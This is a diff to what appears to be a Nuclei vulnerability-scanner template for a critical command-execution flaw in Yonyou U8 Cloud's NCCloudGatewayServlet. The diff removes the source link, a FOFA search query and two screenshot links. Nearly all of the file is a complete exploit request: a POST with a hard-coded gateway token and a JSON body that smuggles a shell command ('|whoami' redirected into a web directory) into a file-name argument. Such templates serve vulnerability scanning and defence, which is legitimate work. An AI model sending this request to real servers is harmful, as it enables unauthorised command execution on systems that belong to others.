@@ -3,15 +3,11 @@ info:
   name: 用友U8 Cloud NCCloudGatewayServlet 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lii1m0vmowqfz3zx'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lii1m0vmowqfz3zx
-    fofa: title=="U8C"
 http:
 - raw:
-  - "POST /service/NCCloudGatewayServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36\nContent-Type: application/json\ngatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3\n\n{\n  \"serviceInfo\": {\n    \"serviceClassName\": \"com.ufida.zior.console.IActionInvokeService\",\n    \"serviceMethodName\": \"exec\",\n    \"serviceMethodArgInfo\": [\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": { \"body\": \"nc.bs.pub.util.ProcessFileUtils\" }\n      },\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": { \"body\": \"openFile\" }\n      },\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": false,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": {\n          \"body\": \"123.txt \\\"|whoami >webapps\\\\u8c_web\\\\1.txt\\\"\"\n        }\n      }\n    ]\n  }\n}\n命令执行结果写入文件\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1759031156107-a52496eb-8fa5-4c9d-b4a6-45754e8da430.png)\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1759031161525-a7ad4363-2051-458d-b4f7-76f2f25688c1.png)"
+  - "POST /service/NCCloudGatewayServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36\nContent-Type: application/json\ngatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3\n\n{\n  \"serviceInfo\": {\n    \"serviceClassName\": \"com.ufida.zior.console.IActionInvokeService\",\n    \"serviceMethodName\": \"exec\",\n    \"serviceMethodArgInfo\": [\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": { \"body\": \"nc.bs.pub.util.ProcessFileUtils\" }\n      },\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": { \"body\": \"openFile\" }\n      },\n      {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\": false,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"argValue\": {\n          \"body\": \"123.txt \\\"|whoami >webapps\\\\u8c_web\\\\1.txt\\\"\"\n        }\n      }\n    ]\n  }\n}\n命令执行结果写入文件"
   redirects: false
   matchers:
   - status:
